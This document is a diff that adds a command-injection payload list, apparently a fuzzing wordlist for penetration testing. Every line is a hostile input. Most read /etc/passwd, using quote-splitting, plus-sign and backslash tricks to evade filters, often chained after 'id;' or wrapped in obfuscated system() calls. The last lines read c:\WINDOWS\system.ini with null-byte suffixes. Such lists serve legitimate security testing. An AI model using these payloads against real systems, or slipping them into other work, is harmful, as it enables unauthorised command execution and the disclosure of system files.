@@ -1,0 +1,94 @@
+cat /etc/passwd
+cat+/etc/passwd
+cat /e'tc'/pa'ss'wd
+c'at' /e'tc'/pa'ss'wd
+c'a't /e't'c/p'a's's'w'd'
+cat+/e't'c/pa'ss'wd
+c'a't+/e't'c/pa'ss'wd
+c\\a\\t+/et\\c/pas\\wd
+id;cat /etc/passwd
+id;cat+/etc/passwd
+id;cat /e'tc'/pa'ss'wd
+id;c'at' /e'tc'/pa'ss'wd
+id;c'a't /e't'c/p'a's's'w'd'
+id;cat+/e't'c/pa'ss'wd
+id;c'a't+/e't'c/pa'ss'wd
+id;c\\a\\t+/et\\c/pas\\wd
+system("cat /etc/passwd")
+system("cat+/etc/passwd")
+system("cat /e'tc'/pa'ss'wd")
+system("c'at' /e'tc'/pa'ss'wd")
+system("c'a't /e't'c/p'a's's'w'd'")
+system("cat+/e't'c/pa'ss'wd")
+system("c'a't+/e't'c/pa'ss'wd")
+id;system("cat /etc/passwd")
+id;system("cat+/etc/passwd")
+id;system("cat /e'tc'/pa'ss'wd")
+id;system("c'at' /e'tc'/pa'ss'wd")
+id;system("c'a't /e't'c/p'a's's'w'd'")
+id;system("cat+/e't'c/pa'ss'wd")
+id;system("c'a't+/e't'c/pa'ss'wd")
+'s''ystem'("cat /etc/passwd")
+'s''ystem'("cat+/etc/passwd")
+'s''ystem'("cat /e'tc'/pa'ss'wd")
+'s''ystem'("c'at' /e'tc'/pa'ss'wd")
+'s''ystem'("c'a't /e't'c/p'a's's'w'd'")
+'s''ystem'("cat+/e't'c/pa'ss'wd")
+'s''ystem'("c'a't+/e't'c/pa'ss'wd")
+id;'s''ystem'("cat /etc/passwd")
+id;'s''ystem'("cat+/etc/passwd")
+id;'s''ystem'("cat /e'tc'/pa'ss'wd")
+id;'s''ystem'("c'at' /e'tc'/pa'ss'wd")
+id;'s''ystem'("c'a't /e't'c/p'a's's'w'd'")
+id;'s''ystem'("cat+/e't'c/pa'ss'wd")
+id;'s''ystem'("c'a't+/e't'c/pa'ss'wd")
+'s''y''stem'("cat /etc/passwd")
+'s''y''stem'("cat+/etc/passwd")
+'s''y''stem'("cat /e'tc'/pa'ss'wd")
+'s''y''stem'("c'at' /e'tc'/pa'ss'wd")
+'s''y''stem'("c'a't /e't'c/p'a's's'w'd'")
+'s''y''stem'("cat+/e't'c/pa'ss'wd")
+'s''y''stem'("c'a't+/e't'c/pa'ss'wd")
+id;'s''y''stem'("cat /etc/passwd")
+id;'s''y''stem'("cat+/etc/passwd")
+id;'s''y''stem'("cat /e'tc'/pa'ss'wd")
+id;'s''y''stem'("c'at' /e'tc'/pa'ss'wd")
+id;'s''y''stem'("c'a't /e't'c/p'a's's'w'd'")
+id;'s''y''stem'("cat+/e't'c/pa'ss'wd")
+id;'s''y''stem'("c'a't+/e't'c/pa'ss'wd")
+'s''y''s''t''em'("cat /etc/passwd")
+'s''y''s''t''em'("cat+/etc/passwd")
+'s''y''s''t''em'("cat /e'tc'/pa'ss'wd")
+'s''y''s''t''em'("c'at' /e'tc'/pa'ss'wd")
+'s''y''s''t''em'("c'a't /e't'c/p'a's's'w'd'")
+'s''y''s''t''em'("cat+/e't'c/pa'ss'wd")
+'s''y''s''t''em'("c'a't+/e't'c/pa'ss'wd")
+id;'s''y''s''t''em'("cat /etc/passwd")
+id;'s''y''s''t''em'("cat+/etc/passwd")
+id;'s''y''s''t''em'("cat /e'tc'/pa'ss'wd")
+id;'s''y''s''t''em'("c'at' /e'tc'/pa'ss'wd")
+id;'s''y''s''t''em'("c'a't /e't'c/p'a's's'w'd'")
+id;'s''y''s''t''em'("cat+/e't'c/pa'ss'wd")
+id;'s''y''s''t''em'("c'a't+/e't'c/pa'ss'wd")
+'s''y''s''t''e''m'("cat /etc/passwd")
+'s''y''s''t''e''m'("cat+/etc/passwd")
+'s''y''s''t''e''m'("cat /e'tc'/pa'ss'wd")
+'s''y''s''t''e''m'("c'at' /e'tc'/pa'ss'wd")
+'s''y''s''t''e''m'("c'a't /e't'c/p'a's's'w'd'")
+'s''y''s''t''e''m'("cat+/e't'c/pa'ss'wd")
+'s''y''s''t''e''m'("c'a't+/e't'c/pa'ss'wd")
+id;'s''y''s''t''e''m'("cat /etc/passwd")
+id;'s''y''s''t''e''m'("cat+/etc/passwd")
+id;'s''y''s''t''e''m'("cat /e'tc'/pa'ss'wd")
+id;'s''y''s''t''e''m'("c'at' /e'tc'/pa'ss'wd")
+id;'s''y''s''t''e''m'("c'a't /e't'c/p'a's's'w'd'")
+id;'s''y''s''t''e''m'("cat+/e't'c/pa'ss'wd")
+id;'s''y''s''t''e''m'("c'a't+/e't'c/pa'ss'wd")
+id;system("type c:\WINDOWS\system.ini")
+system("type c:\WINDOWS\system.ini")
+id;system("type c:\WINDOWS\system.ini%00")
+system("type c:\WINDOWS\system.ini%00")
+id;type c:\WINDOWS\system.ini
+type c:\WINDOWS\system.ini
+id;type c:\WINDOWS\system.ini%00
+type c:\WINDOWS\system.ini%00
